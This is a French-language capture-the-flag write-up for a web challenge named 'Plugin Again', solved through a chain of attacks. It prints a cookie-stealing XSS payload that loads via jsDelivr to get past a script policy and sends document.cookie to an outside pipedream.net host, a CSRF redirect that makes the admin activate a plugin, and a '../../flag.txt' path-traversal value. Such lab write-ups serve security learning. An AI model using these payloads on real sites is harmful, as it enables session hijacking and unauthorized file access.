# Plugin Again

Sur le site on peut écrire des commentaires sur les postes et en regardant un peu les headers on apprends que le site accepete les scripts venant d'un domaine en particulier : `jsdelivr.com`
En se rendant sur `https://www.jsdelivr.com/` on apprend qu'on peut directement faire passer des fichiers de Github :
- De cette manière : `https://cdn.jsdelivr.net/gh/user/repo@version/file`
- Exemple : `https://cdn.jsdelivr.net/gh/darkinfern010/testXSS@main/1.js`

Dans un premier temps on peut essayer de récupérer des cookies des users connecté, puisqu'on peut le voir que Jhonny et Admin sont connectés sur la platforme :
```javascript
function xssPayload() {
  window.location="https://eohab6sr70d2skn.m.pipedream.net/?c"+document.cookie
}

console.log('XSS payload executed');
xssPayload();
```

Et on récupère effectivement un premier cookie de session, en l'utilisant on se connecte en tant que Jhonny.
On a accès à 2 fonctionnalité qui vont être intéressantes, les messages privés et la page plugins.

Dans un premier temps j'ai cru qu'il fallait se connecter en tant qu'admin, alors j'ai mp l'admin avec la même payload qu'avant mais en me connectant j'ai vu qu'on n'avais pas accès à beaucoup plus de choses.
Dans la page plugins on voit qu'un plugin est désactivé et qu'on a pas les droits pour l'activer, alors on va devoir CSRF.
Pour ce faire on va mp l'admin une nouvelle fois mais avec cette payload (toujours gràceà jsDelivr) :
```javascript
location.href = "/activate-plugin/1"
```

Le plugin est bien activé on peut alors passer à la denrière étape, en faisant un peu d'osint on retrouve la template sur [Github](https://github.com/jhonnyCtfSysdream/JhonnyTemplater)
Et dans le fichier `new_post.html` on voit qu'on peut choisir un template pour notre post mais le soucis c'est que le template est ouvert dans `__init__.py` avec la fonction `open`.
Alors on change la value d'un template (directement via l'inspecteur ou burp) en `../../flag.txt` au lieu de `funny` :
`<option id="select1" value="funny">Funny</option>`
devient
`<option id="select1" value="../../flag.txt">Funny</option>`

Et le flag s'affiche à l'écran
